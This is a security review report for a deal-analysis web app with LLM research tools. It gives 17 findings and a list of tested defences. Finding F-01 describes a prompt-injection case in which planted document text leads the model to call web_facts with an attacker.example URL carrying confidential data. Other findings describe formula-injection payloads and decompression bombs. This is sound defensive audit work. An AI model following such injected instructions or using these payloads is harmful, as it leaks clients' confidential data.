# Security review S7.4, round 1

Reviewer: independent AppSec lead. Date: 2026-11-17. Method: ran `python3 -m om.api serve` on 127.0.0.1 with two orgs plus owner, member and viewer users, and attacked it with python and curl. I also read the code for paths I could not run. No code was changed. Nothing was sent to an external host.

Coverage limits (so this is not read as clean):
- The server ran in replay mode. The only LLM paths I exercised are the extractive ones, so prompt injection against a live model was **not** exercised. F-01 and F-13 are code-read.
- `om.api.viewers`, `firm`, `mail` and `watch` are listed in `ROUTE_MODULES` but not in the tree. Their routes return 404 and were not reviewed.
- Not run: `om/web.py` (legacy server, read only), `src/harness/research/email_io.py`, `admin/scim.py`, `mcp/*`, malicious-PDF and OCR paths, and the Docker build. The Dockerfile and compose file were skimmed only.
- Severity is CVSS-like judgement. The Critical/High gate for S7.4 is 0, and I found none, but F-01 is the closest.

## Findings

| id | sev | component | owner | file:line | status |
|---|---|---|---|---|---|
| F-01 | Medium (High once a live model sees VDR text and has `web_facts`) | Research tools: prompt-injection exfiltration | A | `src/harness/research/tools.py:715` (`web_facts`) | CODE-READ ONLY |
| F-02 | Medium | Upload: Office-file decompression bomb | F | `om/api/deals.py:590` (`_office_pages`), `:641` | REPRODUCED |
| F-03 | Medium | Upload: zip path allows 2 GB in-memory expansion | F | `om/api/security.py:221-262` (`iter_zip`) | CODE-READ ONLY |
| F-04 | Medium | Formula injection in the Matrix xlsx export and `sources.csv` | D / F | `om/grid_export.py`; `om/api/citations.py:130` | REPRODUCED (xlsx header), CODE-READ (CSV) |
| F-05 | Medium | No general rate limit or spend cap; 200 MB body buffered before parsing | F | `om/api/server.py:~190` (`_read_body`, `MAX_BODY`); `jobs.py:submit` | CODE-READ ONLY |
| F-06 | Medium | Login limiter keyed by email and IP: lockout DoS and spoofable behind a proxy | F / A (deploy) | `om/api/auth.py:LIMITER`; `server.py:_client_ip` | REPRODUCED (lockout) |
| F-07 | Medium | Dependency: Pillow 12.3.0 carries 42 advisories (fix: 13.0.0) | B / A | `requirements.txt` (Pillow==12.3.0) | REPRODUCED (`pip-audit`) |
| F-08 | Medium | LibreOffice isolation is partial | A / B / C | `om/recalc.py:94-99`; `om/api/decks.py:475`; `om/consistency.py:1521`; `om/images.py:175`; `om/layout.py:332` | CODE-READ ONLY |
| F-09 | Low | Audit log: unkeyed chain, reads and failed logins not logged | F | `om/api/audit.py`; `om/api/deals.py:333` | CODE-READ ONLY |
| F-10 | Low | Account lifecycle gaps | F | `om/api/auth.py:add_member` | CODE-READ ONLY |
| F-11 | Low | Viewer can reach LLM-adjacent POST `grids/{id}/chat` | F | `om/api/grid.py:1313` | REPRODUCED (route reachable) |
| F-12 | Low | Unauthenticated healthz details; no HSTS; Secure cookie depends on client header or env | F / A | `server.py:healthz`; `security.py:is_secure` | REPRODUCED |
| F-13 | Low | User-controlled job `inputs` merged unfiltered; ticker flows into a filename | F | `om/api/jobs.py:submit`; `agents/engines.py:load_cf` | CODE-READ ONLY |
| F-14 | Low | Unbounded threads and SSE streams | F | `server.py:AcretiaServer` | CODE-READ ONLY |
| F-15 | Low | `om/net.fetch_bytes` accepts any URL scheme | A | `om/net.py:28` | CODE-READ ONLY |
| F-16 | Low | Frontend toolchain pins are old (vite 5.4.11, react-router 6.28.0) | F | `frontend/package.json` | CODE-READ ONLY |
| F-17 | Low | CI has no dependency audit or SAST step | A | `.github/workflows/ci.yml` | CODE-READ ONLY |

### Details

**F-01 Prompt-injection exfiltration through `web_facts`.**
- The research tool registry exposes `web_facts(url)` next to `grid_query`, `grid_cell` and `xlsx_evaluate`. A VDR document, email or web page that gets into the model's context can instruct it to call `web_facts("https://attacker.example/?d=<confidential text>")`.
- The Crawler's SSRF guard is strong, but it only blocks private addresses. It does not stop a request that carries data in the path or query to a public host.
- Impact: leakage of deal data from the VDR.
- Fix:
  1. Add an allowlist of fetchable hosts, set per org by admin, defaulting to SEC and the IR domains of the named issuer.
  2. Forbid query strings and long paths unless the URL appears verbatim in the user's request.
  3. Do not offer `web_facts` in a run that also has VDR text in context, or require human approval of the URL.
  4. Log every fetched URL to the evidence bundle and the audit log.

**F-02 Office-file decompression bomb.**
- Reproduction: I built a 183,533-byte `.docx` whose `word/document.xml` expands to 62.9 MB. I uploaded it as a member to `POST /deals/{id}/documents`. It was sniffed as `docx`, queued, and indexed into 46,250 pages. Server RSS reached about 840 MB. In-process `extract_pages` peaked at 769 MB.
- The per-entry cap is 200 MB (`deals.py:593`) with no ratio, entry-count or total check, so one small upload scales to multi-GB. OOM takes down every tenant. `om/xlsx.py:852-941` and `om/extract.py` have the same pattern.
- Fix: run Office uploads through a safe-zip check (ratio, total size, entry count) before parsing, cap page count, and parse with a streaming parser. Consider an indexing subprocess with `RLIMIT_AS`.

**F-03 `iter_zip` 2 GB budget.**
- The ratio limit is 200:1 and applies only above 1 MiB, with a 2 GB total. A roughly 10 MB zip at ratio 190 is accepted and read fully into memory, then stored in the blob store and indexed.
- Fix: stream to disk instead of memory, lower the total to 200–500 MB, and add a per-org quota.

**F-04 Formula injection.**
- Reproduction: a Matrix column named `=SUM(1)` was exported by `GET /grids/{id}/export.xlsx` as a real formula, `<f>SUM(1)</f>`, in `sheet1.xml`. The column name is user-controlled. Cell values are extracted document text that an outside party controls, and the same export path has no neutralisation (no leading `= + - @` guard anywhere in `grid_export.py` or `xlsx.py`).
- `sources.csv` in `sources.zip` (`citations.py`) writes quote and doc_name with a plain `csv.writer` and no guard. The audit export does have `_csv_safe`.
- File names are safe because `sanitize_filename` strips `=`, `+` and `@`. A leading `-` survives.
- Impact: DDE/`HYPERLINK` payloads in files that deal teams open in Excel.
- Fix: in every xlsx and CSV writer, write strings as strings. For xlsx use the string cell type. For CSV prefix `'` on a leading `= + - @ \t \r`, as `audit._csv_safe` already does.

**F-05 Rate limits and body buffering.**
- Only login is rate-limited. Job creation, uploads, schedules and SSE have no per-user or per-org limits or spend caps, so a compromised member account can drive unbounded LLM spend once live mode is on.
- `_read_body` reads up to 200 MB into memory for every request, including the public login and signup routes, before any size check by the handler.
- Fix: per-route body limits (64 KB for JSON, 200 MB only for the upload route after auth), a token bucket per user and org, and a daily job and spend cap.

**F-06 Login limiter.**
- Reproduction: 12 bad passwords for `a@a.com` returned 429 with `Retry-After: 899`, and the correct password was then also refused. Any attacker can lock out a named user, including the only owner.
- Without `ACRETIA_TRUST_PROXY=1`, every client behind Caddy shares one IP, so the key is effectively just the email. With the flag set, the leftmost `X-Forwarded-For` entry is trusted, which is spoofable if any proxy in front appends rather than overwrites.
- Distributed guessing across IPs is also unlimited, because there is no per-email global counter.
- Fix: add a per-email counter with exponential backoff (not a hard block), add a per-IP limiter, set `TRUST_PROXY` in the compose file with Caddy overwriting the header, and take the rightmost trusted hop.

**F-07 Pillow.** `pip-audit -r requirements.txt` reports 42 advisories against Pillow 12.3.0; the lowest fixed version is 13.0.0. Exploitability depends on whether untrusted images reach Pillow. Uploaded PNG/JPG are stored but not parsed, while deck image handling, fonts and OCR may parse them. I did not verify reachability. Fix: bump to 13.0.0 or later and rerun the suite. The only other `pip-audit` hits were in Pillow.

**F-08 LibreOffice.**
- Good: every call uses a fresh `-env:UserInstallation` profile in a temp dir, and one-shot conversions have timeouts (120–180 s). `recalc.py` runs soffice in its own process group and kills the group.
- Gaps:
  - `subprocess.run(..., timeout=)` kills only the direct child. The `soffice` wrapper may leave `soffice.bin` running.
  - No CPU or memory rlimits.
  - No network or filesystem isolation. A pptx or xlsx with external linked images or OLE links can make LibreOffice fetch `http://` or `file://` targets during conversion, which is an SSRF and local-file read risk.
  - Preview rendering in `decks.py` is limited to deliverables the system generated, which lowers exposure today. Any future path that renders an uploaded Office file raises it.
- Fix: a shared `run_soffice()` helper with `start_new_session` plus `killpg` on timeout, `RLIMIT_AS`/`RLIMIT_CPU`, and `--convert-to` inside a container with no network (compose already separates the `data` network). Strip external relationships before conversion.

**F-09 Audit.**
- The hash chain is unkeyed SHA-256, so someone with DB write access can recompute the whole chain. It detects partial edits only.
- Reads are not logged: `document_file`, `page_text` and the Matrix export write nothing. Only `sources.download` is audited. The PLAN production bar says "audit log of every action".
- Failed logins and rate-limit hits are not logged.
- Fix: HMAC the chain with a key outside the DB, or publish periodic chain heads externally. Audit downloads, exports and failed logins.

**F-10 Account lifecycle.**
- `add_member` attaches any existing user, even one from another org, by email without that user's consent, and it confirms whether an email exists. An owner can also set the initial password of a new user.
- There is no password change, password reset or session-revocation endpoint. `users.disabled` can only be set by direct DB edit.
- Fix: use the invite flow for existing users, and add change-password, "sign out everywhere" and disable-user routes.

**F-11 / F-12 / F-13 / F-14 / F-15 / F-16 / F-17 (Low).**
- F-11: a viewer gets 400 (not 403) on `grids/{id}/chat` with an empty body and 200 on `estimate`. The chat is extractive today, but it would become a spend route in live mode and should require `member`.
- F-12:
  - `/api/v1/healthz` is unauthenticated and returns version, llm_mode and engine availability.
  - There is no HSTS header.
  - `is_secure()` trusts `X-Forwarded-Proto` from the client when `ACRETIA_SECURE_COOKIES` is unset. Behind Caddy that is fine, but direct TLS without the env var gives a non-Secure cookie. Set the env var in compose.
- F-13:
  - `inputs` supplied by a member is merged into the job's `inputs_json`. Reserved keys such as `_approvals`, `_pending` and `_agent` should be stripped. A member can already approve, so this is hardening.
  - `ticker` goes into `companyfacts_{t}.json` unvalidated. I found no traversal, because the directory component would have to exist.
- F-14: `ThreadingHTTPServer` has no connection cap, and each SSE stream holds a thread.
- F-15: `om/net.fetch_bytes` calls `urlopen` with any scheme, including `file://`. Callers I saw pass fixed SEC URLs.
- F-16: vite 5.4.11 has dev-server advisories (dev only). react-router 6.28.0 has advisories that apply to framework/SSR mode, which this app does not use. I could not confirm either offline.
- F-17: CI has no `pip-audit` or `npm audit` step. Action pins are by commit SHA, which is good.

## Tested and held

- Cross-org IDOR: org B received 404 on every one of about 60 org-scoped routes using org A's deal, document, grid, job, schedule, citation, notification and agent ids. This covers GET, PATCH, POST, run, cancel, approve and `sources.zip`. SQL is parameterised and filters on `org_id`.
- RBAC: viewer got 403 on all mutating routes tried (jobs, run, patch, delete, upload, audit, invites, members, org). Member got 403 on owner routes. `last_owner` guard present.
- CSRF: PATCH without Origin, with a foreign Origin, `Origin: null`, a suffix-confusion origin, a missing CSRF token and a wrong CSRF token were all 403. Cookies are `HttpOnly; SameSite=Strict`.
- CORS: no `Access-Control-Allow-*` headers on preflight or on responses.
- DNS rebinding: unknown `Host` gave 403, and a wrong port gave 403.
- Session handling: login issues a fresh token and deletes the old session. Tokens are stored as SHA-256. Idle and absolute expiry are enforced. A removed or disabled user's sessions are dropped.
- Passwords: scrypt with a per-user salt, constant-time compare, and a dummy hash for unknown users.
- Signup: closed once an org exists unless `ACRETIA_ALLOW_SIGNUP=1`.
- Security headers: CSP (`script-src 'self'`, `object-src 'none'`, `frame-ancestors 'none'`), nosniff, X-Frame-Options, Referrer-Policy and COOP on every response.
- XXE and billion-laughs: docx with an external entity failed to index (undefined entity). Docx with an entity-expansion bomb failed to index with "limit on input amplification factor breached". lxml 6.1.3 does not resolve external entities by default.
- Stored XSS through file names: `sanitize_filename` removes `<`, `>`, quotes and slashes. The frontend uses no `innerHTML`, `dangerouslySetInnerHTML` or `eval`. Deal names are stored raw but rendered by React as text.
- Frontend links: external hrefs are checked with `^https?://`, `noopener noreferrer` is set, and pdf.js runs with `isEvalSupported: false`. The CSRF token lives in memory and is not persisted. `localStorage` holds only theme, recents and pins.
- Zip handling at the upload boundary: ZipSlip (`..`, absolute paths, drive letters, NUL), symlinks, entry count, nested archives beyond one level, lying size headers and high compression ratios are refused in `iter_zip`. Nested archives are skipped.
- Inline content types: only PDF, PNG and JPG are served inline, chosen by magic-byte sniff. Markup (`<html>`, `<svg>`, `<script>`) is rejected at upload.
- SSRF in the web crawler (`connectors/web.py`): scheme allowlist, no URL credentials, all resolved addresses checked (IPv4-mapped, NAT64, 6to4, Teredo, ULA, link-local and legacy numeric forms), connection pinned to the validated IP, redirects re-validated per hop, robots.txt honoured, 10 MiB cap and a page budget. I read this and did not run it.
- Secrets: the keystore file is mode 0600 in a 0700 directory, secrets at rest use encrypt-then-MAC with a 0600 key file, and the API masks secrets on display. No hard-coded keys found in the paths reviewed. CI actions are pinned by SHA and the SEC secret is only used in the bench job.
- No `pickle`, `yaml.load`, `os.system` or `shell=True` in `om/` or `src/`. All subprocess calls use argument lists.
- Legacy `om/web.py`: binds to 127.0.0.1, checks Host and Origin / Sec-Fetch-Site, and sets security headers (read only). It still has no authentication, which its docstring states.
- Audit CSV export neutralises leading `= + - @`.

## Summary

| Critical | High | Medium | Low |
|---|---|---|---|
| 0 | 0 | 8 | 9 |

By confirmation: F-02, F-04 (xlsx), F-06, F-07, F-11 and F-12 were reproduced; the rest are code-read only.
